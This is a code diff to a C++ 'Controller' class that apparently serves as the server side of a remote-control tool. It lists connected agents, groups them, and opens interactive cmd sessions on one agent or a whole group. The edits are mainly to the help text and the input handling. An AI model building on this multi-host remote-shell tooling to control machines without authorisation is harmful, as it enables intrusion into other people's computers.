@@ -75,7 +75,7 @@ ControllerCommandReq Controller::ValidateUserInput()
 
     while (TRUE) {
 
-        std::cout << "Enter Full command: ";
+        std::cout << "CMD> ";
         std::getline(std::cin, szInput);
 
         std::istringstream iss(szInput);
@@ -83,10 +83,6 @@ ControllerCommandReq Controller::ValidateUserInput()
 
         while (iss >> param) {
             parameters.push_back(param);
-        }
-
-        for (const auto& p : parameters) {
-            std::cout << "- " << p << "\n";
         }
 
         commandType = StringToCommandType(szCommand);
@@ -177,6 +173,9 @@ ControllerCommandReq Controller::ValidateUserInput()
         case CommandType::Man:
             return ControllerCommandReq(CommandType::Man, "", "", "");
 
+        case CommandType::NewLine:
+            break;
+
         default:
             std::cout << "[!] Unrecognized command\n";
             break;
@@ -199,27 +198,19 @@ VOID Controller::HandleCommandObject(ControllerCommandReq commandReq)
         std::cout << szOutputBuffer;
     }
 
-    if (commandType == CommandType::Unknown) {
-        std::cout << "[!] Unrecognized command!\n";
+    if (commandType == CommandType::Unknown || commandType == CommandType::Man) {
         ShowMan();
     }
 
     if (commandType == CommandType::OpenCmdWindow) {
-        std::cout << "[!] CMD command!\n";
-        // validate ip:port / groupname 
         SendCommand(commandReq);
         ReceiveData(szOutputBuffer);
         if (szOutputBuffer != "Found") {
             std::cout << "[!] Could not find " << commandReq.GetTargetAgent() << commandReq.GetGroupName() << "\n";
         }
         else {
-            szOutputBuffer = "C:\\>";
-            arrWindowSessionThreads.emplace_back(&Controller::OpenSessionWindow, this, commandReq, szOutputBuffer);
+            arrWindowSessionThreads.emplace_back(&Controller::OpenSessionWindow, this, commandReq);
         }
-    }
-
-    if (commandType == CommandType::Man) {
-        ShowMan();
     }
 }
 
@@ -273,7 +264,7 @@ BOOL Controller::ReceiveData(std::string& szOutBuffer) {
     return FALSE;
 }
 
-VOID Controller::OpenSessionWindow(ControllerCommandReq commandReq, std::string szInitialCwd)
+VOID Controller::OpenSessionWindow(ControllerCommandReq commandReq)
 {
     BOOL bIsGroupSession;
     BOOL bIsChildCreated;
@@ -345,7 +336,6 @@ VOID Controller::OpenSessionWindow(ControllerCommandReq commandReq, std::string 
     AssignProcessToJobObject(hJobHandle, piProcInfo.hProcess);
     ResumeThread(piProcInfo.hThread);
 
-    // Close unused pipe ends
     CloseHandle(hChildStdoutWrite);
     CloseHandle(hChildStdinRead);
 
@@ -371,7 +361,7 @@ VOID Controller::OpenSessionWindow(ControllerCommandReq commandReq, std::string 
 BOOL Controller::ReadFromChild(HANDLE hChildStdoutRead, std::string& szCommand)
 {
     BOOL bIsReadSuccess;
-    CHAR carrReadBuffer[4096];
+    CHAR carrReadBuffer[MAX_BUFFER_SIZE];
     DWORD dwBytesRead;
     bIsReadSuccess = ReadFile(hChildStdoutRead, carrReadBuffer, sizeof(carrReadBuffer) - 1, &dwBytesRead, NULL);
 
@@ -395,19 +385,21 @@ BOOL Controller::WriteToChild(HANDLE hChildStdinWrite, const std::string& szData
 
 VOID Controller::ShowMan()
 {
-    std::cout << "[*] quit - Kill server and all connections\n";
-    std::cout << "[*] close IP:PORT - Close connection with IP:PORT\n";
-    std::cout << "[*] cmd COMMAND IP:PORT - Execute COMMAND on IP:PORT\n";
-    std::cout << "[*] list - Show all active connections\n";
-    std::cout << "[*] group-create - Create a new control group\n";
-    std::cout << "[*] group-delete GROUPNAME - Delete GROUPNAME control group\n";
-    std::cout << "[*] group-add GROUPNAME IP:PORT - Add IP:PORT to GROUPNAME control group\n";
-    std::cout << "[*] group-remove GROUPNAME IP:PORT - Remove IP:PORT from GROUPNAME control group\n";
-    std::cout << "[*] group-list GROUPNAME - Print the members of GROUPNAME control group\n";
-    std::cout << "[*] group-cmd GROUPNAME COMMAND - Execute COMMAND on members of GROUPNAME control group\n";
-    std::cout << "[*] groups - Print all active control groups\n";
-    std::cout << "[*] man - Show this man page\n";
+    std::cout << "[*] AGENT - Can be used as IP:PORT pair or HOSTNAME:SESSION pair.\n";
+    std::cout << "[*] quit - Kill server and all connections.\n";
+    std::cout << "[*] close AGENT - Close connection.\n";
+    std::cout << "[*] cmd AGENT - Start a cmd session with AGENT.\n";
+    std::cout << "[*] list - Show all active connections.\n";
+    std::cout << "[*] group-create - Create a new empty control group.\n";
+    std::cout << "[*] group-delete GROUPNAME - Delete GROUPNAME control group.\n";
+    std::cout << "[*] group-add GROUPNAME AGENT - Add AGENT to GROUPNAME control group.\n";
+    std::cout << "[*] group-remove GROUPNAME AGENT - Remove AGENT from GROUPNAME control group.\n";
+    std::cout << "[*] group-list GROUPNAME - Print the members of GROUPNAME control group.\n";
+    std::cout << "[*] group-cmd GROUPNAME - Start a cmd session with GROUPNAME control group.\n";
+    std::cout << "[*] groups - Print all active control groups.\n";
+    std::cout << "[*] man - Show this man page.\n";
 }
+
 
 CommandType Controller::StringToCommandType(const std::string& szInput) {
     auto it = StringToCommandTypeMap.find(szInput);
@@ -416,4 +408,3 @@ CommandType Controller::StringToCommandType(const std::string& szInput) {
     }
     return CommandType::Unknown;
 }
-
